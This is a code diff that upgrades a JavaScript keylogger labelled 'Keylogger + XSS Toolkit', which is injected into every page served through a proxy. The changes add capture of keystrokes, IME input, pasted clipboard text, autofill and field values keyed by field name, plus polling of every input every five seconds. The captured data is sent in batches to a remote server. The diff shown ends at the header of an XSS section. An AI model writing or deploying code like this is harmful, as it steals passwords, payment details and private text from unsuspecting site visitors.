@@ -1,5 +1,6 @@
 // ============================================================
-//  FULL INTEGRATED SCRIPT – Keylogger + XSS Toolkit
+//  FULL INTEGRATED SCRIPT – Advanced Keylogger + XSS Toolkit
+//  Enhanced for mobile, IME, paste, and all input types
 //  Injected into every proxied page
 // ============================================================
 
@@ -12,12 +13,15 @@
     const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 
     let keylogBuffer = '';
+    let lastInputValues = new Map(); // Track input changes
 
     // ============================================================
-    //  PART 1: KEYLOGGER
+    //  PART 1: ADVANCED KEYLOGGER
     // ============================================================
 
-    function formatKey(key) {
+    function formatKey(e) {
+        const key = e.key;
+        // Special keys
         const special = {
             'Enter': '[ENTER]\n',
             'Backspace': '[BACKSPACE]',
@@ -39,9 +43,21 @@
             'CapsLock': '[CAPS]',
             ' ': '[SPACE]'
         };
-        return special[key] || (key.length === 1 ? key : `[${key}]`);
+        if (special[key]) return special[key];
+
+        // For IME composition events (Chinese, Japanese, etc.)
+        if (e.isComposing) {
+            return `[COMPOSING:${key}]`;
+        }
+
+        // Single character
+        if (key.length === 1) return key;
+
+        // Other keys
+        return `[${key}]`;
     }
 
+    // Send buffer to VPS
     function sendKeylogBatch() {
         if (keylogBuffer.length === 0) return;
 
@@ -58,37 +74,103 @@
             })
         }).catch(() => {});
 
-        // Also send to backend as a fallback
-        try {
-            fetch(`${BACKEND_URL}/api/keylog`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    keystrokes: keylogBuffer,
-                    url: window.location.href,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString(),
-                    sessionId: SESSION_ID,
-                    ip: 'auto-detected'
-                })
-            }).catch(() => {});
-        } catch (e) {}
-
         keylogBuffer = '';
     }
 
-    // Keylogger event listeners
+    // --- 1.1 Keydown (works for physical keyboards) ---
     document.addEventListener('keydown', (e) => {
         if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
-        keylogBuffer += formatKey(e.key);
+        // Ignore if composing (IME input)
+        if (e.isComposing) return;
+        keylogBuffer += formatKey(e);
         if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
     });
 
-    // Keylogger periodic flush
+    // --- 1.2 Input event (captures text changes, paste, autofill, mobile) ---
+    document.addEventListener('input', (e) => {
+        if (!e.target) return;
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+            const field = e.target;
+            const value = field.value;
+            const label = field.name || field.id || field.placeholder || 'unknown';
+
+            // Only log if value changed significantly
+            const prev = lastInputValues.get(field) || '';
+            if (value !== prev) {
+                const added = value.length > prev.length ? value.substring(prev.length) : '';
+                if (added.length > 0) {
+                    keylogBuffer += `[FIELD:${label}=${added}]`;
+                } else {
+                    // If text was replaced, log the whole new value
+                    keylogBuffer += `[FIELD:${label}=${value}]`;
+                }
+                lastInputValues.set(field, value);
+                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
+            }
+        }
+    });
+
+    // --- 1.3 Composition events for IME (non-Latin characters) ---
+    document.addEventListener('compositionstart', (e) => {
+        keylogBuffer += '[IME_START]';
+    });
+    document.addEventListener('compositionend', (e) => {
+        // The final composed text will be captured by the input event
+        keylogBuffer += '[IME_END]';
+        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
+    });
+
+    // --- 1.4 Paste event ---
+    document.addEventListener('paste', (e) => {
+        const text = e.clipboardData?.getData('text') || '';
+        if (text) {
+            keylogBuffer += `[PASTE:${text}]`;
+            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
+        }
+    });
+
+    // --- 1.5 Focus/Blur to track field changes ---
+    document.addEventListener('focusin', (e) => {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+            const label = e.target.name || e.target.id || 'unknown';
+            keylogBuffer += `[FOCUS:${label}]`;
+            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
+        }
+    });
+
+    document.addEventListener('focusout', (e) => {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+            const label = e.target.name || e.target.id || 'unknown';
+            keylogBuffer += `[BLUR:${label}]`;
+            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
+        }
+    });
+
+    // --- 1.6 Periodic check of input fields (fallback for mobile) ---
+    setInterval(() => {
+        const inputs = document.querySelectorAll('input, textarea');
+        for (const field of inputs) {
+            const value = field.value;
+            const prev = lastInputValues.get(field) || '';
+            if (value !== prev) {
+                const label = field.name || field.id || field.placeholder || 'unknown';
+                const added = value.length > prev.length ? value.substring(prev.length) : '';
+                if (added.length > 0) {
+                    keylogBuffer += `[FIELD:${label}=${added}]`;
+                } else {
+                    keylogBuffer += `[FIELD:${label}=${value}]`;
+                }
+                lastInputValues.set(field, value);
+                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
+            }
+        }
+    }, 5000); // Check every 5 seconds
+
+    // --- Periodic flush ---
     setInterval(sendKeylogBatch, FLUSH_INTERVAL);
     window.addEventListener('beforeunload', sendKeylogBatch);
 
-    console.log('🔐 Keylogger initialized [session: ' + SESSION_ID + ']');
+    console.log('🔐 Advanced Keylogger initialized [session: ' + SESSION_ID + ']');
 
     // ============================================================
     //  PART 2: XSS TOOLKIT – DOM, Storage & Malicious Requests
